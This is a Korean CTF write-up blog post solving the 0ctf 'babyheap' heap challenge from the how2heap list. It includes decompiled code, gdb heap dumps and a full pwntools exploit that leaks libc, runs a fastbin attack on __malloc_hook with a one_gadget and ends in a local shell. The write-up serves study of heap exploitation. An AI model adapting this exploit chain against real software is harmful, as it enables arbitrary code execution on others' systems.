---
title: How2Heap Prob
date: 2019-01-20
---

How2Heap 에서 추천하는 문제들을 풀고 있는데 (귀찮아서 안하고 있음 사실..) HITCON Training 처럼 지속적으로 업데이트 예정이다! 

# 0ctfbabyheap

how2heap 분류에는 fastbin_dup_into_stack이라 되어 있는데 그냥 fastbin attack 인 것 같다. stack 익스할 건덕지가 안보임..

```c
void __fastcall sub_D48(__int64 a1)
{
  signed int i; // [rsp+10h] [rbp-10h]
  signed int v2; // [rsp+14h] [rbp-Ch]
  void *v3; // [rsp+18h] [rbp-8h]

  for ( i = 0; i <= 15; ++i )
  {
    if ( !*(_DWORD *)(24LL * i + a1) )
    {
      printf("Size: ");
      v2 = select_number();
      if ( v2 > 0 )
      {
        if ( v2 > 4096 )
          v2 = 4096;
        v3 = calloc(v2, 1uLL);
        if ( !v3 )
          exit(-1);
        *(_DWORD *)(24LL * i + a1) = 1;
        *(_QWORD *)(a1 + 24LL * i + 8) = v2;
        *(_QWORD *)(a1 + 24LL * i + 16) = v3;
        printf("Allocate Index %d\n", (unsigned int)i);
      }
      return;
    }
  }
}
```

calloc 을 사용하고 특이한건 할당한 chunk에 대한 정보를 버퍼링 함수 안에서 따로 mmap으로 매핑하여 거기서 등록하고 사용한다. 

```c
__int64 __fastcall input_data_chunk(__int64 a1)
{
  __int64 result; // rax
  int v2; // [rsp+18h] [rbp-8h]
  int v3; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = select_number();
  v2 = result;
  if ( (signed int)result >= 0 && (signed int)result <= 15 )
  {
    result = *(unsigned int *)(24LL * (signed int)result + a1);
    if ( (_DWORD)result == 1 )
    {
      printf("Size: ");
      result = select_number();
      v3 = result;
      if ( (signed int)result > 0 )
      {
        printf("Content: ");
        result = read_(*(_QWORD *)(24LL * v2 + a1 + 16), v3);
      }
    }
  }
  return result;
}
```

할당한 chunk에 데이터를 넣을 수 있는데 일단 오버플로우가 나고 매핑된 영역에 flag가 없으면 사용할 수 없다.

```c
signed int __fastcall print_chunk(__int64 a1)
{
  signed int result; // eax
  signed int v2; // [rsp+1Ch] [rbp-4h]

  printf("Index: ");
  result = select_number();
  v2 = result;
  if ( result >= 0 && result <= 15 )
  {
    result = *(_DWORD *)(24LL * result + a1);
    if ( result == 1 )
    {
      puts("Content: ");
      print_sub(*(_QWORD *)(24LL * v2 + a1 + 16), *(_QWORD *)(24LL * v2 + a1 + 8));
      result = puts(byte_14F1);
    }
  }
  return result;
}
```

free는 기본적이라 생략하고 이녀석도 역시 mapped된 영역의 정보를 가지고 출력을 해준다. 주소+할당할 때 size만큼 write로 출력한다. 

익스자체는 간단한데 문제는 leak이다. free시에 chunk 포인터가 비워지기 때문에 간단하게는 leak을 할 수가 없다. 할당되는 포인터를 free된 small bin chunk를 가리키도록 해야 한다.

```c
add(0xf0)
add(0x10)
add(0xf0)
add(0x20)

gdb-peda$ par
addr                prev                size                 status              fd                bk                
0x55d233da8000      0x0                 0x100                Used                None              None
0x55d233da8100      0x0                 0x20                 Used                None              None
0x55d233da8120      0x0                 0x100                Used                None              None
0x55d233da8220      0x0                 0x30                 Used                None              None
```

일단 이런식으로 할당을 해보자

```c
gdb-peda$ 
0x155f6bff2100:	0x0000000000000001	0x00000000000000f0
0x155f6bff2110:	0x000055d233da8010	0x0000000000000001
0x155f6bff2120:	0x0000000000000010	0x000055d233da8110
0x155f6bff2130:	0x0000000000000001	0x00000000000000f0
0x155f6bff2140:	0x000055d233da8130	0x0000000000000001
0x155f6bff2150:	0x0000000000000020	0x000055d233da8230
```

이런식으로 포인터가 설정되어있는데 1 chunk 는 110 을 할당받은 상태다

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk                
0x5596e0b4d000      0x0                 0x100                Freed     0x7f84f4db9b78    0x7f84f4db9b78
0x5596e0b4d100      0x100               0x20                 Used                None              None
0x5596e0b4d120      0x0                 0x100                Used                None              None
0x5596e0b4d220      0x0                 0x30                 Used                None              None

0x41b30777d2a0:	0x0000000000000001	0x0000000000000010
0x41b30777d2b0:	0x00005596e0b4d110	0x0000000000000000
0x41b30777d2c0:	0x0000000000000000	0x0000000000000000
0x41b30777d2d0:	0x0000000000000001	0x00000000000000f0
0x41b30777d2e0:	0x00005596e0b4d130	0x0000000000000001
0x41b30777d2f0:	0x0000000000000020	0x00005596e0b4d230
```

free(1) -> free(0) -> add(0x10) 이런식으로 중간에 더미 fast chunk먼저 해제 하고 small bin 해제 후 다시 fast chunk를 재할당 해보자 0 chunk 가 fast chunk를 반환받았다.

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk                
0x55cb39176000      0x0                 0x220                Freed     0x7f39f36e6b78    0x7f39f36e6b78
0x55cb39176220      0x220               0x30                 Used                None              None
```

그리고 fill 메뉴로 0 chunk 에서 오버플로우를 내 2 chunk 의 prev size와 size를 변조한 후 2 chunk를 free하면 chunk가 병합되게 된다.

```c
gdb-peda$ par
addr                prev                size                 status              fd                bk                
0x55aea9d94000      0x0                 0x100                Used                None              None
0x55aea9d94100      0x0                 0x120                Freed     0x7f6e92846b78    0x7f6e92846b78
0x55aea9d94220      0x120               0x30                 Used                None              None

gdb-peda$ 
0x32f2de63c100:	0x0000000000000000	0x0000000000000000
0x32f2de63c110:	0x0000000000000000	0x0000000000000000
0x32f2de63c120:	0x0000000000000000	0x0000000000000000
0x32f2de63c130:	0x0000000000000000	0x0000000000000000
0x32f2de63c140:	0x0000000000000000	0x0000000000000000
0x32f2de63c150:	0x0000000000000000	0x0000000000000000
0x32f2de63c160:	0x0000000000000001	0x0000000000000010
0x32f2de63c170:	0x000055aea9d94110	0x0000000000000001
0x32f2de63c180:	0x00000000000000f0	0x000055aea9d94010
0x32f2de63c190:	0x0000000000000000	0x0000000000000000
0x32f2de63c1a0:	0x0000000000000000	0x0000000000000001
0x32f2de63c1b0:	0x0000000000000020	0x000055aea9d94230
```

그리고 0xf0 만큼 다시 할당하면 포인터 아다리가 잘 맞게 된다. 0 chunk와 1 chunk가 바뀌었지만 0 chunk에 main.arena.top이 있기에 dump(0)을 해주면 leak이 가능하다.

```python
from pwn import *

t = process('./0ctfbabyheap')

r = lambda w: t.recvuntil(str(w))
s = lambda z: t.sendline(str(z))

def add(a):
	r("Command: ")
	s("1")
	r("Size: ")
	s(str(a))

def fill(a,b,c):
	r("Command: ")
	s("2")
	r("Index: ")
	s(str(a))
	r("Size: ")
	s(str(b))
	r("Content: ")
	s(str(c))

def free(a):
	r("Command: ")
	s("3")
	r("Index: ")
	s(str(a))

def dump(a):
	r("Command: ")
	s("4")
	r("Index: ")
	s(str(a))

add(0xf0)
add(0x10)
add(0xf0)
add(0x20)
free(1)
free(0)
add(0x10)
fill(0,0x20,p64(0)*2 + p64(0x120) + p64(0x100))
free(2)
add(0xf0)
dump(0)
r("Content: \n")
libc = u64(t.recv(6).ljust(8,'\x00')) - 0x3c4b78
log.info("libc ==> " + hex(libc))
one = libc + 0x4526a
malloc_hook = libc + 0x3c4b10

add(0x110)
add(0x60) #4
add(0x60) #5

free(5)
free(4)
add(0x60)
fill(4,0x78,"\x00"*0x68 + p64(0x71) + p64(malloc_hook-35))
add(0x60)
add(0x60)
fill(6,35,"\x00"*3 + p64(one)*4)

r("Command: ")
s(1)
r("Size: ")
s(10)
pause()

t.interactive()
->
bskim@bstime:~$ python babyheap2.py 
[+] Starting local process './0ctfbabyheap': pid 8663
[*] libc ==> 0x7fb39d994000
[*] Paused (press any to continue)
[*] Switching to interactive mode
$ id
uid=1000(bskim) gid=1000(bskim)
```

leak만 되면 다음은 기본 fastbin attack이다. 
